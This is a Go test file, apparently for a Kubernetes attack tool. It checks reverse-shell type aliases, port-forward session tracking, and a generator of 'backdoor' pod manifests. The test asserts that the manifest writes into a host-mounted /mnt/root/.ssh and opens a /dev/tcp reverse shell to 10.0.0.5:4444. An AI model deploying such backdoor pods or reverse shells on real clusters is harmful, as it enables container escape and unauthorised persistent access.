package handler

import (
	"strings"
	"testing"
	"time"

	corev1 "k8s.io/api/core/v1"
	"sigs.k8s.io/yaml"
)

func TestNormalizeReverseShellType(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{name: "empty defaults to bash-i", input: "", want: "bash-i"},
		{name: "default alias", input: "default", want: "bash-i"},
		{name: "nc alias", input: "nc", want: "nc-mkfifo"},
		{name: "keeps supported type", input: "python", want: "python"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := normalizeReverseShellType(tt.input); got != tt.want {
				t.Fatalf("expected %q, got %q", tt.want, got)
			}
		})
	}
}

func TestPortForwardManagerTracksAndStopsSessions(t *testing.T) {
	manager := NewPortForwardManager()
	stopCh := make(chan struct{})
	manager.Add(&portForwardSessionState{
		PortForwardSession: PortForwardSession{
			ID:        "pf-test",
			Namespace: "default",
			PodName:   "nginx",
			LocalPort: 8080,
			PodPort:   80,
			StartedAt: time.Now(),
		},
		stopCh: stopCh,
	})

	if got := manager.List(); len(got) != 1 || got[0].ID != "pf-test" {
		t.Fatalf("expected tracked session, got %#v", got)
	}
	session, ok := manager.Stop("pf-test")
	if !ok || session.ID != "pf-test" {
		t.Fatalf("expected stop to return tracked session, got %#v ok=%v", session, ok)
	}
	select {
	case <-stopCh:
	default:
		t.Fatalf("expected stop channel to be closed")
	}
	if got := manager.List(); len(got) != 0 {
		t.Fatalf("expected no sessions after stop, got %#v", got)
	}
}

func TestSuggestLocalPortAvoidsPrivilegedPorts(t *testing.T) {
	if got := suggestLocalPort(80); got < 1024 {
		t.Fatalf("expected non-privileged port for pod port 80, got %d", got)
	}
}

func TestGenerateBackdoorYAMLProducesValidPodManifest(t *testing.T) {
	manifest := generateBackdoorYAML(BackdoorConfig{
		Namespace: "default",
		PodName:   "backdoor-pod",
		Image:     "ubuntu:latest",
		MountPath: "/mnt",
		LHost:     "10.0.0.5",
		LPort:     "4444",
		SSHKey:    "ssh-rsa AAAATEST",
	})

	var pod corev1.Pod
	if err := yaml.Unmarshal([]byte(manifest), &pod); err != nil {
		t.Fatalf("expected generated manifest to be valid pod yaml, got error: %v\nmanifest:\n%s", err, manifest)
	}
	if pod.Namespace != "default" {
		t.Fatalf("expected namespace default, got %q", pod.Namespace)
	}
	if len(pod.Spec.Containers) != 1 {
		t.Fatalf("expected one container, got %d", len(pod.Spec.Containers))
	}
	if len(pod.Spec.Containers[0].Args) != 2 {
		t.Fatalf("expected shell args, got %#v", pod.Spec.Containers[0].Args)
	}
	script := pod.Spec.Containers[0].Args[1]
	for _, needle := range []string{"/mnt/root/.ssh", "/dev/tcp/10.0.0.5/4444", "while true; do sleep 3600; done"} {
		if !strings.Contains(script, needle) {
			t.Fatalf("expected script to contain %q, got %q", needle, script)
		}
	}
}
